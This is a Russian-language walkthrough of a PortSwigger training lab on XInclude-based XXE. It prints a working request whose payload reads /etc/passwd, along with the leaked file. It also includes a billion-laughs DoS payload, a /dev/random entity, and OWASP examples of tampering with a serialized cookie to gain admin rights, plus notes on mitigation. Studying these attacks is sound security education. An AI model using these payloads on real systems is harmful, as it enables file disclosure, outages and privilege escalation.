## XInclude in XXE attack

#### > В общих чертах: как работает, зачем нужен

XXE (или вставка внешних сущностей XML) - уязвимость, позволяющая злоумышленнику вмешиваться в обработку XML-данных веб-приложений (сайтов) при их отправке на сервер. Чаще всего используется для просмотра файлов в файловой системе сервера приложений, а так же других серверов или внешних систем, к которым приложение может получить доступ. Результат уязвимости можно посмотреть в ответе приложения (response). Так же возможно осуществление DoS атак (например уязвимость 'Denial-of-Service').

<i>Чтобы выполнить атаку <b>XInclude</b>, необходимо указать пространство имен XInclude и путь к файлу, содержимое которого требуется получить</i>

---

##### > Разберу по шагам пример того, как работает данная уязвимость

Открою ссылку на лабу из практической работы
> https://portswigger.net/web-security/xxe/lab-xinclude-attack

Нам дано:

- Есть некий сайт с товарами
- По товарам можно посмотреть детализацию (кнопка 1)
- В детализации можно проверить наличие товара в разных магазинах (кнопка 2)

Рассмотрю запрос по кнопке 2 (наличие товара в магазинах)

<b>Запрос 1</b>

~~~
POST /product/stock HTTP/1.1
Host: 0a9700f203ced1b4c026723800b50012.web-security-academy.net
Cookie: session=QZMMaj22B268131231nL1AmaboxdzxV
Origin: https://0a9700f203ced1b4c026723800b50012.web-security-academy.net
Accept: */*
Referer: https://0a9700f203ced1b4c026723800b50012.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 21

productId=2&storeId=1
~~~

В запросе, как минимум, 2 изменяемых параметра.
~~~
productId=2
storeId=1
~~~

Подставлю в значение параметр productId текст из [примера](https://gist.github.com/jakekarnes42/effe052f1095532cda84307024b3d512) к практической работе
~~~
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
~~~

Теперь текст <b>запроса 1</b> будет выглядеть так (все спец. символы из текста выше заменены кодами):

~~~
POST /product/stock HTTP/1.1
Host: 0a9700f203ced1b4c026723800b50012.web-security-academy.net
Cookie: session=QZMMaj22B268131231nL1AmaboxdzxV
Origin: https://0a9700f203ced1b4c026723800b50012.web-security-academy.net
Accept: */*
Referer: https://0a9700f203ced1b4c026723800b50012.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 21

productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e%20&storeId=1
~~~

Теперь выполню (отправлю на сервер) <b>запрос 1</b> и посмотрю ответ сервера (response):

Обычный удачный ответ от сервера выглядит так, но это не наш случай:

~~~
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 3

456
~~~

<b>Ответ сервера при атаке XInclude:</b>

~~~
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1279

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin"
~~~

Как видим, это содержимое файла <b>/etc/passwd</b>

---

##### > Причина возникновения уязвимости

Практически все уязвимости XXE возникают из-за того, что библиотека синтаксического анализа XML-приложения поддерживает потенциально опасные функции XML, которые приложению по сути не нужны или не предназначены для использования.
Самый простой и эффективный способ предотвратить атаки XXE — отключить эти функции.
Как правило, достаточно отключить разрешение внешних сущностей и отключить поддержку XInclude.
Обычно это можно сделать с помощью параметров конфигурации или программного переопределения поведения по умолчанию.

---

##### > "Отказ в обслуживании" (Denial-of-Service)

<b>Пример 1</b>
Пример атаки состоит из определения 10 сущностей, каждая из которых определяется как состоящая из 10 предыдущих сущностей, с документом, состоящим из одного экземпляра наибольшей сущности, которая расширяется до одного миллиарда копий первой сущности

[Описание атаки (wiki)](https://en.wikipedia.org/wiki/Billion_laughs_attack)

~~~
POST http://somesite.com/xml HTTP/1.1
<?xml version="1.0" ?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<foo>
  &lol9;
</foo>
~~~

![здесь могла быть картинка](https://i.stack.imgur.com/hYnmH.png)

<b>Пример 2</b>
Злоумышленник пытается вызвать отказ в обслуживании, используя потенциально бесконечный файл:

~~~
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
~~~


---
##### > Атаки на механизм сериализации/десериализации, приводящие к частичному или полному отказу в обслуживании

Небезопасная десериализация (Insecure Deserialization) - это уязвимость, при которой злоумышленник внедряет вредоносный объект в приложение при передаче сериализованных данных, что часто приводит к удаленному выполнению кода, обходу пути, повышению привилегий, обходу аутентификации и многому другому

[> Источник примеров](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization.html)

<b>Пример 1</b>

Приложение React вызывает набор микросервисов Spring Boot. Программисты пылаись сделать свой код иммутабельным (неизменяемым), но вот решение что они придумали, заключалось в сериализации пользовательского состояния и передаче его с клиента на сервер с каждым запросом. Злоумышленник замечает сигнатуру объекта Java «R00» и использует инструмент Java Serial Killer для удаленного выполнения кода на сервере приложений

<b>Пример 2</b>
Форум PHP использует сериализацию объектов PHP для сохранения "super" файла cookie, содержащего идентификатор пользователя, роль, хэш пароля и другое состояние.

Форум на PHP использует сериализацию объектов PHP Java для создания супер cookie, a:4 содержащей ID пользователя, его роль, хеш пароля и другое состояние:

~~~
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
~~~

Злоумышленник изменяет сериализованный объект, чтобы предоставить себе права администратора:

~~~
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
~~~
